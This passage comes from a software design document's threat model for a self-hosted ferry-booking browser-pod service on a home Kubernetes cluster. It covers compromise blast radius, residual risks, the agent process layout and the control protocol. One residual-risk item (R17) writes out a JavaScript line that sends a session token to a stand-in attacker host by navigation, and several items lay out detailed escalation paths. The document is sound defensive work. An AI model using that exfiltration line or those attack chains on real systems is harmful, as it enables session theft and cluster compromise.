| C31 | The operator holds no PDB, ConfigMap, Service, route or workload-controller verbs; holds are protected by the agent's drain, not by objects the operator writes | Operator-written objects becoming a lever (the draft's anchor GC hazard) | RBAC; `can-i` negatives | M1 |
| C32 | One hold per user at a time (owner, round 3): an agent carts only after ferry-control grants a `cart_claim`, which it does in one SQL statement only if the user has no hold and no live claim | Two pods of one user (the warm pod and a short-check pod) holding carts at once | ferry-control (`hold_claims`); agent (compiled: no cart without a granted claim) | M1 |

### 4.5 Blast radius if each component is compromised

| Compromised | Can | Cannot |
|---|---|---|
| ferry-web (A1) | Phish from the dashboard origin and its service worker. Read every tenant's itineraries and email. Create, edit or delete trips. Release carts. Raise limits up to the GitOps ceilings. Send any text to tenants' push and email (it holds the VAPID key and SMTP access). Act as any user (it is the session authority) and read the session tokens of users who load its pages. Serve script that makes blind same-site requests to other `chestr.dev` apps carrying the owner's Authelia cookie (R12). **Mint VNC tickets for holding carts**, so it can win the race to a hold's *first* connection (the user then sees "opened on another device", before any card entry), and can pass a ticket out through a push message it sends. | Create, alter or exec into pods. Reach pods. Learn `N`, so it cannot join a session the user already opened (C11) or co-view (C12). Erase audit. Write `trip_state`, pod bindings or alert memory (role grants). Get tokens for any other OIDC client of Authelia (its secret is for the `ferry-watch` client only) or see the owner's Authelia cookie (removed at the route). |
| vnc-edge (A1) | **Fully inside the VNC confidentiality and integrity boundary**: read keystrokes and screens of sessions passing through it, inject key and pointer events (`-AcceptCutText=1` included), observe tickets and `N`, and use an observed `N` to reconnect (and, with preemption, displace the user's socket) for the rest of that hold. Hold sockets open. | Mint tickets. Reach any pod path other than `:6080/ws`. Reach ferry-web, ferry-control or Postgres. Mitigation: vnc-edge is a stock nginx image with static files and a short config, no secrets and no app code. Envoy and Cloudflare sit in the same boundary (R4). |
| ferry-control (A4, through A3) | Forge any trip's status. Send `release`, `drain` or `vnc_revoke` to any agent. Write typed agent alerts for any user. Grant cart claims freely (several holds per user at once; each pod is still capped at 6 cart attempts). **Create and delete pinned browser pods** for any trip and owner, up to the ResourceQuota (availability, and IP-budget abuse through the pods it starts). **Set the hold-egress label on any browser pod**, letting code running in that pod reach any public HTTPS host (R22). Read tenants' itineraries and emails (its DB grants include them). | Mint VNC tickets (no key). Change image, env, volumes, commands, deadline or any field other than that one label (VAP). Read Secrets, exec, read logs, proxy. Get page content. Touch any other namespace. Write `users`, limits or audit updates (role grants). |
| A browser pod (A3) | Its own tenant's current session and card entry. Lie about its own trip, within the operator's clock and the deadline. Attack ferry-control's parser. **Send unbounded requests from the home IP to the hosts its policy allows** (bcferries.com and Queue-it; during a hold, any public HTTPS host and any DNS name), bypassing the agent's budget; bounded only by the egress bandwidth annotation, if S-CIL shows it works (R13, R22). | Reach other pods, the API server, the LAN, nodes, smtp-relay, observability or metadata at any time, or the public internet outside a hold. Use its token anywhere but ferry-control. Affect another tenant's trip. |
| A malicious tenant (A2) | Browse any public HTTPS site from the home IP during their own holds, through links (kiosk mode has no address bar; owner accepted, round 3, R22). Card-test at BC Ferries checkout from the home IP (bounded by holds per day). | Get another tenant's trips or VNC (404s, ticket binding). Exceed the ceilings. Persist anything across pods. Reach private or cluster addresses. |

### 4.6 Residual risks, stated plainly

- **R1 Cluster admin.** The owner and anything with cluster-admin can see everything, including a live VNC
  session: `openclaw` (which also has a VictoriaLogs skill wired to hosted LLMs) and `home-cluster-runner`.
  The runner also holds Talos `os:admin` and runs a `pull_request` workflow on what appears to be a public
  repo; depending on GitHub's approval settings, a fork PR may run code there. The owner leaves the runner
  as it is (round 3), so this is a stated residual, not a gate. Tenants are told the cluster admin, and the
  automation that acts with its rights, can technically see everything (round 3); admins get no VNC, exec or
  screenshots inside the app.
- **R2 Sandbox and kernel: a risk-acceptance choice, not a functional requirement** (explained here because
  the owner asked in round 2 why it was needed).
  - *What the sandbox is.* Chromium normally runs each web page in a sandboxed "renderer" process, so a bug
    that lets a malicious page run code is trapped in a process that can do almost nothing. Inside
    containers that sandbox needs Linux user namespaces, which these pods don't get by default (Talos sets
    `user.max_user_namespaces=0`, and containerd's default seccomp profile blocks the calls, §2.2). So
    Playwright starts Chromium with `--no-sandbox`: `site.py:154-157` launches it without
    `chromium_sandbox`, and Playwright's default is to add the flag.
  - *What that means.* A malicious script on bcferries.com, Queue-it, or a payment or 3-D Secure page that
    exploits a Chromium bug runs code directly in that pod, as uid 1001, the same user as the agent and the
    gate. It can land at any point in the pod's life, not only during checkout: a pod renders BC Ferries
    and Queue-it pages for up to about a day before any hold (C17's 26 h deadline). It can then wait for the
    checkout and read the card as it is typed; it can also open Xvnc's socket (C13).
  - *What contains it, and how far.* One pod per trip, destroyed after any viewed hold and within 26 h; no
    stored secrets and no API token in the pod; the egress allowlist; the hub binding to its own trip. That
    keeps the damage to one tenant's pod (plus the home IP's budget, R13) **only while two other layers
    hold**:
    - ferry-control's parser. A parser exploit is A4 (§4.5): it reads every tenant's itineraries and emails
      and creates or deletes pinned pods for any owner (C3).
    - The Linux kernel. No LSM confines the container (`apparmor=0 security=none`), and every node is a
      control-plane node that also runs workloads (`talos/controlplane.yaml:191`). A kernel escape from a
      browser pod is therefore node root next to etcd and the API server: the whole home cluster, including
      the writable 1Password ClusterSecretStore and Authelia.
  - *What would put the sandbox back.* Enabling user namespaces on Talos (the sysctl plus a Localhost
    seccomp profile, applied per node) and turning on the VAP params `sandbox`, `seccompProfile` and
    `requireUserNamespace` (S-SBX). Then a renderer exploit needs a second, sandbox-escape bug before it
    reaches the pod.
  - *The kernel flags.* Separately, the nodes boot with `mitigations=off` (the kernel's defences against
    CPU side channels of the Spectre and MDS kind are disabled for speed, on Intel CPUs), `apparmor=0` and
    `security=none`. Page JavaScript alone is limited by each Chromium's site isolation and coarse timers.
    But once an exploit gives native code in an unsandboxed pod, side-channel attacks can target kernel
    memory and every workload on that node, not only other tenants' browsers.
  - *Recommendation (planner's; the owner asked why it was needed and has not yet decided, Q1).* Neither
    change is needed for the product to work; both are risk acceptance. Enabling the sandbox (with
    `hostUsers: false`) and revisiting the kernel flags is proposed as **optional hardening in the backlog
    (M4, about 4 days: S-SBX about 1, the change about 3), recommended before inviting people the owner
    doesn't know well**, and not a gate unless the owner makes it one. Accepting it means accepting a
    Chromium exploit as a risk to that tenant's checkout, and, chained with a kernel or parser bug, to the
    whole cluster. The VAP params that can require the sandbox stay in place (a two-way door).
- **R3 A compromised ferry-web can race a hold's first VNC connection** (visible, before card entry), and can
  phish through the dashboard and alerts. Closing the race needs an IdP-asserted principal verified by the
  pod (S-VNCID), which stays in the M4 backlog. Accepted for invite-only (owner, round 3).
- **R4 Plaintext keystrokes on infrastructure.** Cloudflare's edge, cloudflared, Envoy, vnc-edge and the pod
  see checkout keystrokes (RFB is plaintext after TLS ends), including a BC Ferries password if a user signs
  in during checkout despite the advice (§5.7). vnc-edge, Envoy and Cloudflare can also inject input and
  reuse `N`. Whether relaying a cardholder's own keystrokes puts the owner in PCI scope is a grey
  area. Tenants are told, naming Cloudflare.
- **R5 BC Ferries' own page supply chain.** Third-party scripts on bcferries.com or the payment pages can skim
  cards, exactly as in a normal browser. During a hold, third-party scripts that the allowlist blocks the
  rest of the time (analytics, tag managers) load too, as they would in the user's own browser.
- **R6 One residential IP.** A Queue-it or BC Ferries block hits every tenant and the owner's household. The
  budget and brake reduce the risk but cannot remove it. There is also ToS and fairness exposure, given BC
  Ferries' 2026 alert and waitlist programmes.
- **R7 Policy gaps.** One missed VAP field, or a Cilium behaviour different from what was tested, silently
  reopens a path. Mitigated by allowlist-style VAPs, independent second checks (gate crypto, no SA token, no
  Secrets) and the CI and post-deploy matrices. Not eliminated.
- **R8 Disruption loses carts.** A node crash, OOM or node-pressure eviction (0 s grace) skips the drain;
  BC Ferries keeps the cart until its own timer runs out (its length is learned from production, §8.2). In
  v1 a Talos upgrade also releases any hold
  on the drained node (orderly, with an alert), because there is no hold PDB (§7.8).
- **R9 A tenant who owns their own pod** can keep its hold open until the operator's clock (hard cap + 5 min)
  and can lie about their own trip.
- **R10 Plaintext in-cluster agent channel.** A node-level sniffer can replay one pod's token for up to
  10 min, as that pod only. TLS or WireGuard on :8766 is M4.
- **R11 Integrity and availability of the control plane.** Any compromised control process can delete trips,
  release carts or stop pods. Audit makes this visible; it does not prevent it.
- **R12 The Authelia cookie.** Server-side replay is resolved in v1: the app sets no cookie, so the dashboard
  route removes the whole Cookie header and ferry-web never sees `authelia-home-ops` (C16). What the route
  cannot stop is the browser itself: script served from `ferry.chestr.dev` is same-site with every
  `*.chestr.dev` app, and the cookie is `SameSite=Lax` (Authelia's default, upstream
  `internal/configuration/schema/session.go:30,89`; not overridden in `configuration.yaml:32-41`), so the
  browser attaches it to same-site requests that script makes. An injected script is held back by the
  dashboard's CSP (`connect-src 'self'`, `form-action 'self'`), but a compromised ferry-web serves its own
  CSP and could send blind state-changing requests to the owner's other `chestr.dev` apps as the owner.
  Every other app on `chestr.dev` has the same exposure today. A separate registrable domain for Ferry Watch
  (the first-list Q6 option) is the remaining mitigation; it stays possible later (new hostnames, certificate and
  tunnel entries; users sign in again and re-subscribe to push). The server-side half returns only if a
  later design puts a cookie on the ferry host (an app cookie, a cookie-based proxy, or Envoy Gateway's
  OIDC filter); the choice between gateway-wide Lua and a separate domain then comes back (§6.2.5).
- **R13 A3 can spend the home IP's budget.** The budget, brake and 30 s floor live in agent code. Code
  execution in a pod (after a Chromium exploit under `--no-sandbox`, R2) bypasses them toward the hosts the
  pod's policy allows (bcferries.com and Queue-it; any public HTTPS host during a hold, R22). The only
  technical bound is `kubernetes.io/egress-bandwidth: 20M`, a bytes-per-second cap (many
  small requests fit) that is itself unverified with netkit. The request-level fix is a per-pod rate-limiting
  egress proxy (smokescreen-style, M4). Until then the owner accepts this; the optional sandbox hardening
  (R2) would raise the bar.
- **R14 The shared Postgres superuser is resident in `ferry-watch`.** `components/cnpg` copies it into
  `ferrywatch-initdb-secret`. No app identity can read Secrets or create pods there, and only the stock
  `postgres-init` image uses it, but anything that gains pod-create or secret-read in `ferry-watch` reaches
  Authelia, lldap and Immich data. The owner keeps the standard component permanently (round 3): an accepted
  residual, with no follow-up work planned.
- **R15** *Withdrawn in round 2.* Trusted headers are no longer used in production, so there is no gateway
  policy whose absence would fail open (§6.2).
- **R16 The hold-egress label doesn't apply in time.** Rewritten in round 3: no host list exists any more,
  because egress is open to public HTTPS while a cart is held. If ferry-control is down when a cart becomes
  READY, or the label patch fails, the payment or bank page can't load and checkout breaks at the last step.
  The agent detects the failed frame, ferry-control re-applies the label when it can and alerts the admin,
  and the user can retry or use "Release and book it myself" (§3.6 step 6). If S-CIL shows label changes are
  slow or unreliable, the fallback is public HTTPS egress at all times (§7.6).
- **R17 The app session token is readable by script on the dashboard origin.** The bearer token lives in
  localStorage on `ferry.chestr.dev`, so any XSS there (a bug in the SPA, or a compromised dependency in its
  bundle) can read it, send it off-origin and use it from another device until it is revoked or its next IdP
  re-verification falls due (at most 24 h; a thief cannot re-verify without the victim's Authelia session,
  §6.2.2). An HttpOnly cookie would hide it from script but would bring the cookie problem back (R12), and
  XSS could act as the user with a cookie too; what the cookie would add is only "not usable off-device".
  The existing strict hash-based CSP (`server.py:232-251`: scripts only from `'self'` plus hashed inline
  bootstraps, `connect-src 'self'`, `form-action 'self'`, `base-uri 'none'`) makes injection hard and
  blocks exfiltration by fetch, XHR, WebSocket and forms, but a script that does run can still leak the
  token by navigation (for example `location = 'https://evil.example/?t=' + token`), which no CSP directive
  restricts. The rest rests on: the 24 h re-verification, 7-day idle and 30-day absolute expiry, server-side
  revocation on logout, "sign out everywhere" and suspension, and VNC still needing a ticket bound to the
  pod's owner, trip and cart, with a first-viewer lock a stolen session cannot pass once the user is
  connected (C11). A shorter re-verification period, or a device-bound token (a DPoP-style proof from a
  non-extractable WebCrypto key), would shrink the window further (M4).
- **R18 Sign-in from the iOS home-screen app may land in another browser context.** A home-screen web app
  keeps its own storage, separate from Safari. If iOS opens the redirect to Authelia, or the redirect back,
  outside the app, the callback cannot find the app's `state` and PKCE verifier, and sign-in fails or
  happens in Safari instead. A first sign-in may also leave the app partway through (to copy the password
  from Mail or a password manager; there is no second-factor step, because the client is `one_factor`); if
  iOS evicts the backgrounded app, it relaunches at `/` and the in-flight sign-in is lost. Unverified; S-IOS
  checks both on the owner's iPhone during M1. The fallbacks are a one-time handoff code, a pending sign-in
  kept in localStorage for 10 minutes, and the first sign-in in Safari or on a computer (§6.2.4).
- **R19 Unauthenticated requests now reach ferry-web.** Under ext-auth nothing reached ferry-web without an
  Authelia session. Now anyone the Cloudflare geo-block lets through can load the static shell, call
  `/auth/*`, open a WebSocket that must authenticate within 5 s, and get 401 from `/api/*`. No data or
  action is reachable without a valid session. The pre-auth surface is kept small: request bodies on
  `/auth/*` are capped at 4 KiB; `/auth/*` and unauthenticated sockets are rate-limited and capped per
  client (keyed on `CF-Connecting-IP`), with a global ceiling only as a backstop, so one client cannot use up
  everyone's sign-ins (a Cloudflare rate-limiting rule on `/auth/*` and `/api/ws` is an option); the
  dashboard socket accepts messages of at most 4 KiB; and aiohttp stays pinned and patched.
- **R20 IdP changes reach the app at the next re-verification, not at once.** Authelia applies the client's
  authorization policy, and refreshes the user from LDAP, only when it handles an authorization request
  (§2.2). Under the ext-auth design every request was re-checked; now ferry-web trusts its own session
  between visits to Authelia. Removing someone from lldap group `ferry-watch`, disabling or deleting them in
  lldap, or resetting a compromised Authelia account therefore takes effect in the app at that person's
  next re-verification, at most 24 h later (§6.2.2), and only then are `autoApproveGroups` and
  `identities.last_groups` re-read. Until then they keep full access, including VNC ticket minting for their
  own holds. The "Removing a person" runbook (§12.5) suspends them in the app first, which revokes every
  session and closes their sockets at once, and changes lldap second.
- **R21 Authelia's `sub` follows the username.** Authelia creates the opaque `sub` per username and reuses it
  (`internal/oidc/store.go:76-101`). A new lldap user given a username that someone used before receives the
  old person's `sub`, so the old uid: their trips, push subscriptions (the old person's devices would get
  the new person's alerts), admin or bootstrap status, and VNC tickets that pass the pod's
  `sub == FW_OWNER` check. lldap usernames are unique only at a given moment. Mitigations: never reuse an
  lldap username, or delete the user in Ferry Watch (user, `identities` row, push subscriptions) before
  deleting or renaming them in lldap (§12.5); a sign-in whose `email` differs from the stored one is
  flagged on the Users page for review.
- **R22 Open egress during holds** (owner, round 3, accepted). While a cart is held, the pod can reach any
  public HTTPS host and resolve any name, so any bank's 3DS works. Consequences: a tenant can browse other
  sites from the owner's home IP during their own hold, by following links (kiosk mode has no address bar),
  for at most the hard cap (60 min) and within their daily holds; code running in a holding pod (A3) can
  reach any public HTTPS host, so it can send what it reads off-site and use the home IP as a proxy for that
  hour, and can tunnel data through DNS; a compromised ferry-control can set the label on any pod (§4.5).
  Private, cluster, node, metadata, smtp-relay and observability destinations stay denied in every state.
  Outside holds the allowlist applies, which keeps a pod that is only watching (most of its life) confined
  to BC Ferries and Queue-it. The simpler alternative, public egress at all times, would extend all of this
  to every pod for its whole life (§7.6).

---
## 5. Browser pod (agent)

### 5.1 Process layout and shutdown

`tini --` (not `-g`; `Dockerfile:67` today uses `-g`) runs `ferry-watch-agent`, which is the supervisor. It
replaces `entrypoint.sh` and its `wait -n; exit 1` (`entrypoint.sh:38-39`):

1. It creates `HOME=/tmp/home` (as `entrypoint.sh:14-17` does) and `/tmp/kasm` (mode 0700).
2. It starts Xvnc with RFB on the unix socket `/tmp/kasm/rfb.sock` only (§5.6), then matchbox, each in its
   own session (`setsid`) so a TERM from tini reaches only the agent. matchbox runs with no title bar and
   no key bindings (`-kbdconfig /dev/null`): its defaults would let the viewer close the checkout window
   (Alt+C), switch windows (Alt+N, Alt+Tab) or start a terminal (Ctrl+Alt+X).
3. It launches Chromium through Playwright with `handle_sigterm/handle_sigint/handle_sighup=False`.
4. It runs the self-tests (§5.6), then the hub client, the gate (:6080), the probe server (:8080) and the
   one-trip Watcher.
5. **On SIGTERM** (pod delete, eviction by a node drain, deadline), the drain budget is 60 s inside
   `terminationGracePeriodSeconds: 90`:
   1. stop checks and refuse new viewers;
   2. if a non-FAILED cart is held and payment is not in progress, run `empty_cart()` with the Queue-it wait
      capped at 45 s instead of the 10 min at `site.py:52` (`QUEUE_TIMEOUT_MS`), then verify it;
   3. send `bye`, close Chromium, stop Xvnc and matchbox, write the termination reason, exit 0.
6. If Xvnc or Chromium dies unexpectedly, the agent reports `cart_lost` (when holding) and
   `bye{reason: fatal}`, then exits non-zero. The fleet loop recycles with back-off.

**Termination message (C30).** The agent writes exactly one line to `/dev/termination-log`:
`<bye reason enum> <error class enum|->`. Nothing user- or page-derived is ever written there, because
`pods get` lets the operator read it. An image test asserts the file's grammar.

No lifecycle hooks exist, so the VAP forbids them outright. This fixes three things:
- SIGTERM killing Chromium before the cart is emptied (tini `-g` plus Playwright's default `handleSIGTERM`
  [R:limits-reaping-lifecycle]);
- `_close_all` never emptying carts (`watcher.py:368-373`);
- `empty_cart` never verifying (`site.py:400-401`).

### 5.2 What moves from today's code

| Today | Becomes |
|---|---|
| `watcher.py:42`, `:103`, `:131` ConfigStore and its subscription | `OneTripStore` (same `.config` and `.subscribe` surface), fed by `configure`. `rev` replaces the in-process edit re-reads (`:251-255`, `:426-428`, `:461-468`); a `state` older than the latest rev is dropped. |
| `watcher.py:54` `LOGIN_BACKOFF_SECONDS`, `:110` credentials, `:122` secrets, `:128` `_login_lock`, `:130` `_login_blocked_until`, `:299-300`, `:315-318`, `:333-349` login and back-off | Not wired in guest mode (`credentials=None`, `_wants_login` always False). **Kept, not deleted**, behind a disabled `login_enabled` flag that v1 images never set, with its tests ported to the one-trip agent and run in CI with the flag forced on (§11.4), so an account mode can return without rewriting it (a two-way door, §5.7). |
| `watcher.py:113`, `:127` `concurrency=3`, `_slots` | Concurrency 1; the semaphore is removed. |
| `watcher.py:141-145` `check_now` for all trips | `command{check_now}` for this trip; ignored if a check ran in the last 15 s. |
| `watcher.py:147-162` `release_cart`/`dismiss_cart` with the `cart_id` token | Unchanged, driven by `command{release, cart_id}` and `command{dismiss, cart_id}`. |
| `watcher.py:228-229` `_active` uses `date >= today` | Active until the last in-window departure has passed (Pacific, `models.py:13-14`). |
| `watcher.py:265-266` interval from `store.config` | Interval from `configure.interval_s` (the poll curve, `polling.py`, stretched by the budget, §9.3), clamped to ≥ 30 s (compiled), keeping ±15 % jitter (`:46`). Local token bucket (burst 2). Fail-slow: if ferry-control has been silent for 10 min, `max(interval, 300 s)`. |
| (new) | `configure.mode`: `warm` checks on its interval until recycled or drained; `short_check` walks the form, checks once, and then sends `bye{short_check_done}` and exits, unless it carts (then it stays for that hold and exits after it). |
| `watcher.py:72` `Session.show()`, `:312`, `:351-356`, `:506-507`, `site.py:403-405` `_raise_held_windows` and `show()` | Deleted, including the protocol method. One window per pod. |
| `watcher.py:401-422` `_failed` | Kept. Error classes cross as enums (`errors.py:8-38`), plus new `Blocked` (403/429/challenge page) and `NotYetBookable` (date beyond the schedule). Until real pages for them are captured (§12.1, fixture capture during M1), both are classified conservatively as `MarkupChanged`. Pod recycle after 6 consecutive failures (context reset at 3 stays, `:52`). |
| `watcher.py:441`, `:470` alert memory: every alerted departure, carted or not, joins `alerted` | Two sets. `alerted` (alerted and carted, or viewed) is never re-carted. `offered` (alerted as bookable because a limit suppressed the cart) may be carted once later if still open when the limit clears, with one re-alert. |
| `watcher.py:459`, `:562` `trip.auto_cart and self._credentials is not None` | `trip.auto_cart and self._cart_allowed`. `_cart_allowed` = `configure.auto_cart` (daily holds and attempts, VNC minutes, quiet hours) AND compiled limits (≤ 6 attempts per pod; no new cart within 100 min of `FW_DEADLINE_AT`) AND a `cart_claim` granted by ferry-control in the last 30 s (one hold per user, C32). |
| `watcher.py:112`, `:124`, `:498`, `:516`, `:526`, `settings.py:30`, `:50-54` `cart_hold_minutes` (0 = forever) | A `HoldPolicy` with four clocks: unclaimed (from control ack), session (from first connect), viewer-gone (from last disconnect), hard (from READY). All clamped to compiled maxima; "forever" no longer exists. A **payment guard** pauses session and viewer-gone while a frame is on a host other than bcferries.com or Queue-it (a payment or bank page) or the payment step was submitted. |
| `watcher.py:510-542` `_service_cart` | Gains the timers, viewer state, the release check, cart-liveness checks while unclaimed, BC Ferries confirmation detection (`outcome=booked`), detection of the login page or an account-required page during checkout (`checkout_login_seen`) and of a cart the site has expired, and C22. After a **viewed** hold: empty (unless payment is in progress), verify, `bye`, exit 0 (instead of resuming at `:536-541`). After an unviewed expiry: a warm pod resumes in place; a short-check pod exits. |
| `watcher.py:529-530` window closed, watching resumed | Not reachable: the window is the pod; viewer disconnects are handled by the gate clocks. |
| `watcher.py:531-535` lost cart: forget the alert and re-cart | Re-cart only if no checkout viewer ever connected. If one had, keep the departure in `alerted` (C22). |
| `watcher.py:368-373` `_close_all` | Empties and verifies held carts before closing (drain path). |
| `watcher.py:555-564` `_alert` builds a `Message` with a URL | Emits `alert{kind, params}` (typed, no text, no URL). |
| `watcher.py:96-97`, `:568-595` alert memory keyed by `repr(search_key)` | `alerted[]` and `offered[]` arrive in `configure`, persisted by ferry-control, keyed by `sha256(canonical JSON of search_key)`. A held departure is removed on boot, as today (`:577`). |
| `site.py:149-160` `_launch` | `launch_persistent_context("/tmp/profile")` with `--kiosk`, `--disk-cache-size=33554432` and `ignore_default_args=["--disable-popup-blocking", "--enable-automation"]` (the second drops the "controlled by automated test software" bar from the checkout). `env={DISPLAY, HOME, TMPDIR, TZ}`. `handle_sig*=False`. `chromium_sandbox=(FW_SANDBOX=="1")`. |
| `site.py:167-176` `new_session` | Pages come from the single persistent context; the user agent is unchanged (owner, round 3). |
| `site.py:400-401` `empty_cart` | Navigates, then **checks the landing URL now**; the full "cart is empty" check is added once the cart and release pages are captured from the owner's M1 use. Until then a release is best effort, with BC Ferries' own cart timer as the backstop, and every release is counted by how far it was checked (`release_check` in `bye`; `ferrywatch_releases_total{check}`). A failed landing-URL check (or, later, a non-empty cart) raises `ReleaseUnverified`; the admin is alerted. |
| `site.py:407-422` debug snapshots | tmpfs only, none while holding, never fetchable. |
| `site.py:42-47`, `:66-87` `BASE_URL`, `USER_AGENT`, `Credentials`, `search_url` | Move to `ferry_watch_core/bcferries/urls.py` (Playwright-free). `Credentials` is kept for the disabled login path. |
| `site.py:270-301` `login()` | Kept unchanged behind the disabled flag (see the login row above). Never called in v1. |
| `site.py:112` `base_url` parameter | Overridable only in the `agent-e2e` image, enabled by a baked marker file. |
| `state.py` `RuntimeState`, `Cart` (`:36-44`, `cart.id` at `:40`) | Reused in the agent. `cart.id` is the `cart_id` tickets bind to. |
| `entrypoint.sh:20-26` Xvnc flags | §5.6. `-AlwaysShared`, `-interface 0.0.0.0`, `-websocketPort` and `-httpd` are removed; `:99`, `-geometry`, `-depth 24` and `-DisableBasicAuth` stay (it gives the gate's client its view and input rights). |
| `Dockerfile:36-38` `/vnc` symlink, `:65` `USER pwuser`, `:67` `tini -g` | Symlink removed. `USER 1001:1001` (numeric). `ENTRYPOINT ["/usr/bin/tini","--","ferry-watch-agent"]`. Firefox and WebKit removed from the image. |

**As built:** the one-trip watcher is a new module, `src/ferry_watch/agent/watch.py` (`TripWatcher`), rather
than edits to `watcher.py`, which keeps running today's single-container app until cutover and is deleted with
it. The rows above describe what changed relative to `watcher.py`. The login path is not yet ported; it stays in
`watcher.py` (and its tests) until then.

### 5.3 Protocol v1 (agent ↔ ferry-control)

One WebSocket to `ws://ferry-control.ferry-watch.svc.cluster.local.:8766/agent/v1` (fully qualified with a
trailing dot, so no search list is walked; §7.6). The agent always dials; reconnect back-off is 1, 2, 5, 10,
30 s. Frames are JSON, at most 64 KiB, at most 10/s. Schemas live in `ferry_watch_core.protocol` as
`msgspec.Struct(forbid_unknown_fields=True)`, with every string and list capped. Envelope:
`{v: 1, type, seq, trip, boot, rev}`. `seq` is monotonic per agent boot. Agent→control messages that matter
(`alert`, `event`, `bye`) are buffered until acked (at most 200) and replayed on `hello`. ferry-control
dedupes on `(pod_uid, boot, seq)`.

| Dir | Type | Fields |
|---|---|---|
| A→C | `hello` | `proto: [1]`, `agent_version`, `pod_name`, `gen`, `applied_rev`, `snapshot` (a `state`), `unacked[]`. No image digest: the pod's eight env vars (§7.4) don't carry it and an image can't know its own; ferry-control records the digest-pinned image it created the pod with (`browser_pods.image_digest`), and the hello's `agent_version` (`browser_pods.agent_version`), for the admin page. |
| A→C | `state` | `phase` (starting/watching/holding/draining), `checking`, `checked_at`, `next_due`, `retry_at`, `effective_interval`, `sailings[≤60]{depart, arrive, vessel≤64, status enum, fares[≤6]{name≤32, price, selectable}}`, `error{class enum, text≤300 masked by describe()}`, `consecutive_errors`, `cart{id, status, depart, fare, price, ready_at, unclaimed_deadline, session_deadline, hard_deadline, payment_in_progress}\|null`, `viewer{connected, first_at, seconds}`, `alerted[HH:MM ≤100]`, `offered[HH:MM ≤100]`, `navs{refresh, search, cart, empty, route_info}` since the last message, `queue_detours`, `working_set_mb`, `lockdown_ok`, `bucket`. Sent on change (coalesced over 250 ms) and at least every 15 s. |
| A→C | `event` | `code` enum (session_opened, sold_out_again, check_failed, cart_added, cart_released, viewer_connected, viewer_disconnected, booking_confirmed, checkout_host_blocked, checkout_login_seen, cart_expired_by_site, opening_seen, opening_gone, …), `params{depart?, fare?, minutes?, class?, seconds?, forced?}` (`forced` only on `checkout_login_seen`, §5.7). No free text, no hostnames. |
| A→C | `alert` | `kind` enum (bookable, cart_held, cart_failed, cart_lost, cart_expired, failing, hold_reminder, hold_ending, release_unverified, checkout_blocked), `params{departures[≤10], fare?, price?, minutes?, error_class?, by_site?}` |
| A→C | `cart_claim` | `depart`, `fare` (the trip's fare preference: the fare itself isn't known until it's selected). Round 3: asked before every `add_to_cart`. Not buffered: with no connection, or no answer within 10 s, the answer is no. |
| A→C | `bye` | `reason` enum (hold_ended, drained, deadline, recycle, startup_failed, lockdown_failed, fatal, smoke_done, short_check_done), `outcome` enum (booked, released, expired, expired_by_site, payment_left_to_site, none), `cart_emptied`, `release_check` enum (cart_empty, landing_url, none), `viewer_was_connected` |
| C→A | `hello_ack` | `server_time`, `accepted_proto`, `resend_from` |
| C→A | `cart_claim_result` | `claim` (the claim's `seq`), `granted`, `reason` enum (ok, holding_elsewhere, no_holds_left, quiet_hours, carting_paused, limit). A granted claim lapses after 2 min without `cart_held` or `cart_failed` (the agent must start carting within 30 s of the grant, and `add_to_cart` takes at most 40 s). |
| C→A | `configure` | `rev`, `trip` (`Trip.to_json`; the agent re-validates with `Trip.from_json` and requires `id == FW_TRIP_ID`), `active`, `mode` enum (warm, short_check; round 3), `interval_s`, `auto_cart`, `checkout_mode` enum (v1 defines only `guest`; reserved so an account mode is a protocol addition, not a change of meaning), `hold{unclaimed_s, session_s, viewer_gone_s, hard_s}`, `alerted[]`, `offered[]`, `vnc_allowed`, `brake{multiplier, paused}`, `breaker` (closed/open) |
| C→A | `command` | `id`, `op`: `check_now` \| `release{cart_id}` \| `dismiss{cart_id}` \| `drain{reason}` \| `vnc_revoke{reason}` |
| C→A | `ack` | `seq` |

**Deliberately absent:** navigate, URL, base_url, eval, selector, screenshot, cookies, storage_state,
credentials, log level, tracing, Chromium flags, file transfer, "extend hold", and anything that grants VNC.
ferry-control can only *revoke* VNC (`vnc_allowed=false`, `vnc_revoke`). The agent fetches the terminal list
itself (`terminals.py`), so labels from the control plane never feed navigation. The draft's `reauth`
message and 5-minute re-review are dropped: the token is checked at connect, and in one process the fleet
loop closes a pod's socket itself when it deletes the pod.

`src/ferry_watch/protocol.py` implements this table, including the round-3 additions (`mode`,
`short_check_done` and the `cart_claim` pair). Two field names differ from the
table because the envelope already uses the planned ones: `configure.trip` is `trip_spec` in code (the
envelope's `trip` is the trip id), and `ack.seq` is `acked` (the envelope's `seq` is the ack's own). The agent never learns or sets its egress
label; ferry-control changes it from the cart state it already receives.

**Versioning:** ferry-control accepts protocols N and N-1. Every pod is gone within 26 h, so releases at
least 26 h apart are safe. A CI skew job (the N-1 agent image against the new control image) starts with the
first protocol change after v1; before that there is no N-1.

### 5.4 Agent-side invariants (compiled, not configurable)

- `interval_s ≥ 30` (the same floor as `MIN_INTERVAL`, `polling.py:21`). Hold clocks: unclaimed ≤ 45 min,
  session ≤ 45 min, viewer-gone ≤ 15 min, hard ≤ 90 min. No zero or "forever". The payment guard pauses only
  session and viewer-gone, never the hard cap.
- At most 6 cart attempts per pod lifetime. No new cart within 100 min of `FW_DEADLINE_AT`. No new cart
  without a `cart_claim` granted in the last 30 s.
- In `short_check` mode: one check, then exit, unless it carts; never a second check.
- `configure.trip.id == FW_TRIP_ID`; otherwise `bye{fatal}`.
- If ferry-control has been unreachable for 10 min: `interval = max(interval, 300 s)`. Holds and the gate
  keep running.
- With `lockdown_ok == false`: never cart, never open the gate. Report it and exit after 5 min.
- Recycle when `now ≥ FW_DEADLINE_AT − 120 min − jitter(0..144 min)` (about 24 h −10 %), only while Watching
  and idle.
- If `FW_TRIP_ID == "0000000000000000"` (the reserved smoke trip, created with a reserved system owner uid that no person can map to), run the egress and lockdown matrix
  (§11.4), report results as typed events, and exit with `bye{smoke_done}`; never navigate a booking form.

These bind the agent's own code. A pod running attacker code (A3) is not bound by them (R13).

### 5.5 VNC gate

The gate is an aiohttp server inside the agent on `:6080`. **It serves only `GET /ws` (upgrade).** Every
other path returns 404, and it never serves HTML.

**Ticket**, minted by ferry-web with Ed25519 (`kid`-tagged):

`{iss: "fw-web", aud: "fw-vnc", sub: <uid>, trip, pod, cart_id, jti, iat, exp: iat+60, disp: {route≤64, date, depart, fare≤32, session_s, hard_deadline}}`

`aud` names the ticket's purpose. v1 defines one audience, `fw-vnc` (checkout): its ticket carries `cart_id`
and its step-2 condition below is a READY cart. The gate rejects every other audience. A later purpose, such
